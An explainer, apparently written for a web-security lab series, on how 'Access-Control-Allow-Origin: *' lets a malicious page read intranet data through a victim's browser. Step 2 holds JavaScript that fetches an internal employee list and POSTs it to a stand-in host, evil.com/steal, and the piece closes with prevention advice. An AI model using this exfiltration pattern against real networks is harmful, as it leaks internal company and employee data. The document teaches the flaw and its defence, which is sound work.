# Intranets and CORS Without Credentials - Explained From Zero

Let me explain this using simple analogies and no assumed knowledge.

---

## First, Let's Understand the Basics

### What is an Intranet?

Think of the internet as a **public city park** — anyone can walk in.

An **intranet** is like a **private office building**:
- Only employees can enter
- Outsiders can't see what's inside
- It's behind a locked door (the company firewall)

**Examples of intranet sites:**
- Employee payroll system
- Internal company wiki
- HR portal
- Internal file server

**These sites are NOT accessible from the outside internet.**

---

## The Problem This Section Addresses

### Normal CORS Attack (with credentials)

In previous labs, the attack relied on:

```http
Access-Control-Allow-Credentials: true
```

This header tells the browser: *"It's OK to send cookies with this cross-origin request."*

Without this header, the browser **won't send cookies** — so you can only access **public, non-login content**.

### So What's the Problem?

If you can't steal cookies (credentials), isn't the attack useless?

**YES — for public websites.** But **NO — for intranet websites.**

---

## Why Intranets Are Different

### Scenario 1: Public Website (e.g., gmail.com)

| Can attacker access? | How? |
|---------------------|------|
| With cookies? | ❌ No — browser won't send them without `credentials: true` |
| Without cookies? | ✅ Yes — but only public content (like login page) |

**Result:** Attack is useless because public content is already... public.

### Scenario 2: Internal Intranet Website

| Can attacker access? | How? |
|---------------------|------|
| From the outside internet? | ❌ **No — completely blocked!** |
| From inside the company network? | ✅ Yes — but attacker isn't inside |

**Key point:** The attacker **cannot** browse to `http://intranet.company.com` directly — it's behind the firewall.

---

## The Attack: CORS Without Credentials on Intranet

### What Makes This Work

Even though the browser **won't send cookies** (no credentials), the intranet site might still return **sensitive internal data** that doesn't require login.

**Example internal data:**
- List of employee names
- Internal server status
- Configuration files
- Internal document paths
- Network topology information

### The CORS Header That Makes It Possible

```http
Access-Control-Allow-Origin: *
```

This means: **"Any website can read my responses"**

---

## Step-by-Step Attack Flow

### Step 1: Attacker lures victim to malicious website

Victim is **inside the company network** (at work, on VPN, etc.)

They visit: `https://evil.com`

### Step 2: Malicious JavaScript runs in victim's browser

```javascript
// This runs on evil.com, but in the victim's browser
fetch('http://intranet.company.com/internal/employee-list')
    .then(response => response.text())
    .then(data => {
        // Send stolen internal data to attacker
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: data
        });
    });
```

### Step 3: Browser makes the request

```
GET /internal/employee-list
Host: intranet.company.com
Origin: https://evil.com
```

**Notice:** No cookies are sent (because no `credentials: true`)

### Step 4: Intranet server responds

The intranet server doesn't require login for this internal page:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: text/html

<html>
    <h1>Employee Directory</h1>
    <ul>
        <li>John Smith - jsmith@company.com</li>
        <li>Jane Doe - jdoe@company.com</li>
        <li>CEO - cto@company.com</li>
    </ul>
</html>
```

### Step 5: Browser checks CORS

The response has:
```
Access-Control-Allow-Origin: *
```

The browser says: *"Anyone can read this response — including evil.com!"*

### Step 6: JavaScript reads the data

```javascript
// The attacker's code receives the employee list
data = "<html><h1>Employee Directory</h1><ul><li>John Smith...</li>..."
```

### Step 7: Data is sent to attacker's server

```
POST https://evil.com/steal
Body: (the entire employee list)
```

---

## Visual Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│  ATTACKER'S WEBSITE (evil.com)                                  │
│  JavaScript: fetch('http://intranet.company.com/employee-list') │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ Victim visits evil.com
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  VICTIM'S BROWSER (Inside company network)                      │
│  - Has access to intranet.company.com                           │
│  - Executes the malicious JavaScript                            │
│  - Makes request to intranet site                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ Request from victim's browser
                              │ Origin: https://evil.com
                              │ No cookies sent
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  INTRANET SERVER (intranet.company.com)                         │
│  - Not accessible from outside internet                         │
│  - Returns internal data (no login required)                    │
│  - Response includes: Access-Control-Allow-Origin: *            │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ Response sent back to victim's browser
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  VICTIM'S BROWSER                                               │
│  - Checks CORS header: "*" means anyone can read                │
│  - Gives response to JavaScript                                 │
│  - JavaScript sends data to attacker                            │
└─────────────────────────────────────────────────────────────────┘
                              │
                              │ Stolen data sent
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  ATTACKER'S SERVER (evil.com)                                   │
│  - Receives internal company data                               │
│  - Attacker now has employee list, internal docs, etc.          │
└─────────────────────────────────────────────────────────────────┘
```

---

## Why This Is Dangerous

### The Attacker Gains:

| Type of Data | Example |
|--------------|---------|
| Internal information | Employee emails, org chart |
| Network details | Internal IP addresses, server names |
| Configuration | Database connection strings |
| Internal APIs | Endpoints that shouldn't be public |
| Development tools | Internal testing interfaces |

### The Attacker Cannot Access Directly

Because the intranet is behind a firewall, the attacker **cannot** simply visit `http://intranet.company.com` themselves.

But by using the **victim's browser as a proxy**, they can access internal data.

---

## Real-World Example

### The Setup

```
Company: MegaCorp
Internal site: http://hr.internal.megacorp.com
Content: Employee salaries (no login required — "internal only")
CORS header: Access-Control-Allow-Origin: *

Attacker: Evil.com
```

### The Attack

1. Evil.com sends email to MegaCorp employee: "Check out this funny cat video"
2. Employee clicks link while at work
3. Evil.com JavaScript fetches `http://hr.internal.megacorp.com/salaries`
4. Intranet server responds with salary data + `Access-Control-Allow-Origin: *`
5. Browser gives data to JavaScript
6. JavaScript sends salaries to Evil.com
7. Attacker now has everyone's salary

---

## Comparison: With vs Without Credentials

| Aspect | With Credentials | Without Credentials (Intranet) |
|--------|-----------------|-------------------------------|
| **Cookies sent?** | Yes | No |
| **Can attack public sites?** | Yes (steal user data) | No (only public content) |
| **Can attack intranet?** | Yes (even better) | **Yes — and attacker can't access directly** |
| **Requires** | `ACAO: specific-origin` + `ACAC: true` | `ACAO: *` |
| **Risk** | Data theft + session hijacking | Internal data leakage |

---

## Why Intranet Sites Are Often Vulnerable

### Common Mistakes

| Mistake | Why it happens |
|---------|----------------|
| `Access-Control-Allow-Origin: *` | "It's internal only, who cares?" |
| No authentication on internal pages | "Firewall is our security" |
| Weak CORS configuration | "No one from outside can reach this" |
| Assumption of safety | "It's behind VPN/firewall" |

### The Flawed Logic

Developer thinks:
> "This page is only accessible from inside our network. The firewall protects it."

Reality:
> **Any internal user's browser can be tricked into accessing it and leaking data.**

---

## The One-Sentence Takeaway

> **Even without sending cookies (credentials), an attacker can steal internal intranet data if the site uses `Access-Control-Allow-Origin: *` — because the attacker can't access the intranet directly, but the victim's browser can.**

---

## Summary Table

| | **Public Website** | **Intranet Website** |
|--|-------------------|---------------------|
| **Attacker can access directly?** | Yes | **No** (behind firewall) |
| **CORS without credentials works?** | Useless (public content only) | **Dangerous** (internal data) |
| **Why?** | Attacker can just visit the site | Attacker can't visit — needs victim as proxy |
| **Impact** | Low | **Medium to High** |

---

## Prevention (For Developers)

### ❌ Bad Configuration
```http
Access-Control-Allow-Origin: *
```

### ✅ Good Configuration
```http
# Only allow specific, trusted external origins
Access-Control-Allow-Origin: https://trusted-partner.com

# Or don't use CORS at all for internal-only APIs
# (remove CORS headers entirely)
```

### Best Practices for Intranet Sites

1. **Never use `Access-Control-Allow-Origin: *`** on internal sites
2. **Require authentication** for ALL internal pages (even "non-sensitive" ones)
3. **Use specific origins** if CORS is absolutely needed
4. **Assume an attacker can run code** inside your network (via phishing)
5. **Treat internal sites as potentially exposed** to malicious JavaScript

---

## Final Analogy

**Intranet without firewall:** Like leaving your house door wide open

**Intranet with firewall:** Like locking your front door

**CORS without credentials on intranet:** Like a window on the second floor that's open

The attacker can't get through the front door (firewall), but they can trick someone **already inside the house** (victim's browser) to look out the window and describe what they see.

The attacker never enters the house — but they still get information. 🪟